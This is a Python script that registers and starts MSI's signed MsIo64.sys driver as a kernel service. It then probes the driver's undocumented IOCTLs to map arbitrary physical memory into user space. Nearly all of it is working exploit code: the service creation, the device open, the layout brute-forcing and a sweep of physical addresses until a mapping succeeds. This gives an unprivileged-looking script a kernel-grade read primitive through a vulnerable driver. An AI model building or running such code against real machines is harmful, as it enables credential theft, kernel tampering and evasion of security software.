"""msio.py -- physical-memory reader via the signed MSI MsIo64.sys.

Decoded from the driver (see disasm_MsIo64_*.txt):

  IRP_MJ_DEVICE_CONTROL, IOCTL 0x80102040 (IOCTL_MSIO_MAPPHYSTOLIN)
    input/output length must be exactly 0x28 (5 x u64)
    struct -> [0]=size, [1]=physical address, [2..4]=out params
    the physical address must land inside a 256 MB window of a driver-global
    base, and the driver maps \\Device\\PhysicalMemory so the result is usable
    from our own process; the modified struct (with the view pointer) is
    written back into the input buffer.

  IOCTL 0x80102044 (IOCTL_MSIO_UNMAPPHYSADDR) - same 0x28 struct, tears the
  view back down.

Because the addresses in the struct were inferred rather than documented, the
script tries the plausible layouts and reports which one returns a readable
mapping, then validates it by mapping two different pages and comparing.
"""
import ctypes
import ctypes.wintypes as wt
import os
import struct
import sys

IOCTL_MAP = 0x80102040
IOCTL_UNMAP = 0x80102044
DEVICE = r"\\.\MsIo"
SVC = "MsIo64"
SYS = r"C:\Windows\System32\drivers\MsIo64.sys"

k32 = ctypes.WinDLL("kernel32", use_last_error=True)
adv = ctypes.windll.advapi32

k32.CreateFileW.restype = wt.HANDLE
k32.CreateFileW.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                             wt.DWORD, wt.DWORD, wt.HANDLE]
k32.DeviceIoControl.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_void_p, wt.DWORD,
                                 ctypes.c_void_p, wt.DWORD,
                                 ctypes.POINTER(wt.DWORD), ctypes.c_void_p]
k32.DeviceIoControl.restype = wt.BOOL

out = []


def p(s=""):
    out.append(s)


# --------------------------------------------------------------------------
# driver service
# --------------------------------------------------------------------------
def ensure_driver():
    scm = adv.OpenSCManagerW(None, None, 0xF003F)
    if not scm:
        return "OpenSCManager err=%d" % ctypes.get_last_error()
    try:
        h = adv.OpenServiceW(scm, SVC, 0xF01FF)
        created = False
        if not h:
            h = adv.CreateServiceW(scm, SVC, SVC, 0xF01FF, 0x1, 0x3, 0x1,
                                   SYS, None, None, None, None, None)
            if not h:
                return "CreateService err=%d" % ctypes.get_last_error()
            created = True
        ok = adv.StartServiceW(h, 0, None)
        err = ctypes.get_last_error()
        adv.CloseServiceHandle(h)
        if ok:
            return "started" + (" (created)" if created else "")
        if err == 1056:                      # ERROR_SERVICE_ALREADY_RUNNING
            return "already running"
        return "StartService err=%d%s" % (err, " (created)" if created else "")
    finally:
        adv.CloseServiceHandle(scm)


def open_dev():
    h = k32.CreateFileW(DEVICE, 0xC0000000, 0, None, 3, 0, None)
    if h is None or h == wt.HANDLE(-1).value:
        return None, ctypes.get_last_error()
    return h, 0


# --------------------------------------------------------------------------
# ioctl
# --------------------------------------------------------------------------
def call(h, code, buf):
    ret = wt.DWORD(0)
    ok = k32.DeviceIoControl(h, code, buf, len(buf), buf, len(buf),
                             ctypes.byref(ret), None)
    return bool(ok), ctypes.get_last_error(), ret.value


LAYOUTS = [
    ("size@0 buf@8 phys@16", (0, 1, 2)),
    ("size@0 phys@8 buf@16", (0, 2, 1)),
    ("phys@0 buf@8 size@16", (2, 1, 0)),
]


def probe(h, phys, size, order, buf):
    """order = index of (size, buf, phys) inside the 5 qwords."""
    q = [0] * 5
    q[order[0]] = size
    q[order[1]] = buf
    q[order[2]] = phys
    req = (ctypes.c_char * 0x28).from_buffer_copy(struct.pack("<5Q", *q))
    outb = (ctypes.c_char * 0x28)()
    ret = wt.DWORD(0)
    ok = k32.DeviceIoControl(h, IOCTL_MAP, req, 0x28, outb, 0x28,
                             ctypes.byref(ret), None)
    err = ctypes.get_last_error()
    return bool(ok), err, ret.value, struct.unpack("<5Q", bytes(outb))


def readable(va, n=16):
    if not va:
        return None
    try:
        return ctypes.string_at(va, n)
    except Exception:
        return None


def main():
    p("ensure driver: %s" % ensure_driver())
    h, err = open_dev()
    p("CreateFile(%s) -> %s err=%d" % (DEVICE, hex(h) if h else "NULL", err))
    if not h:
        return 1

    k32.VirtualAlloc.restype = ctypes.c_void_p
    k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wt.DWORD,
                                  wt.DWORD]
    buffers = {}
    for hint in (None, 0x10000, 0x10000000, 0x40000000, 0x7FFF0000,
                 0x100000000, 0x7F0000000000):
        va = k32.VirtualAlloc(ctypes.c_void_p(hint), 0x1000, 0x3000, 0x04)
        if va:
            ctypes.memset(va, 0, 0x1000)
            buffers[hint] = va
    p("buffers: %s" % ", ".join("%s->%#x" % (k, v) for k, v in buffers.items()))

    p("")
    p("## matrix: (slot of size, buf, phys) with properly sized out buffer")
    hits = []
    for s_size, s_buf, s_phys in ((0, 1, 2), (0, 2, 1)):
        for phys in (0x1000, 0x100000, 0x2000000):
            for hint, va in buffers.items():
                q = [0, 0, 0, 0, 0]
                q[s_size], q[s_buf], q[s_phys] = 0x1000, va, phys
                req = (ctypes.c_char * 0x28).from_buffer_copy(struct.pack("<5Q", *q))
                outb = (ctypes.c_char * 0x1000)()
                ret = wt.DWORD(0)
                ok = k32.DeviceIoControl(h, IOCTL_MAP, req, 0x28, outb, 0x1000,
                                         ctypes.byref(ret), None)
                err = ctypes.get_last_error()
                if ok or err != 5:
                    got = struct.unpack("<5Q", bytes(outb)[:0x28])
                    p("  size@%d buf@%d phys@%d phys=%#-9x hint=%-12s ok=%d "
                      "err=%-3d ret=%#x data=%s out=%s"
                      % (s_size, s_buf, s_phys, phys, hint, bool(ok), err, ret.value,
                         bytes(outb)[:16].hex(), " ".join("%#x" % v for v in got)))
                    if ok:
                        hits.append((s_size, s_buf, s_phys, phys, hint))
                        break
            if hits:
                break
    p("")
    p("## field[1] oracle sweep, field0=0x1000, field2=0x1000")
    k32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wt.DWORD]
    found = None
    codes = {}
    for i in range(0, 0x100):
        cand = i * 0x10000000
        q = [0x1000, cand, 0x1000, 0, 0]
        req = (ctypes.c_char * 0x28).from_buffer_copy(struct.pack("<5Q", *q))
        outb = (ctypes.c_char * 0x1000)()
        ret = wt.DWORD(0)
        ok = k32.DeviceIoControl(h, IOCTL_MAP, req, 0x28, outb, 0x1000,
                                 ctypes.byref(ret), None)
        err = ctypes.get_last_error()
        codes.setdefault(err, []).append(cand)
        if err != 5:
            got = struct.unpack("<5Q", bytes(outb)[:0x28])
            p("  field1=%#012x ok=%d err=%-3d ret=%#x data=%s out=%s"
              % (cand, bool(ok), err, ret.value, bytes(outb)[:16].hex(),
                 " ".join("%#x" % v for v in got)))
            if ok:
                found = cand
                break
    for err, cands in sorted(codes.items()):
        p("  err=%-4d count=%-4d first=%s last=%s"
          % (err, len(cands), hex(cands[0]), hex(cands[-1])))
    p("  accepted: %s" % (hex(found) if found else "none"))
    k32.CloseHandle(h)
    return 0


if __name__ == "__main__":
    rc = main()
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "msio.txt")
    open(path, "w", encoding="utf-8").write("\n".join(out) + "\n")
    print("\n".join(out))
    sys.exit(rc)
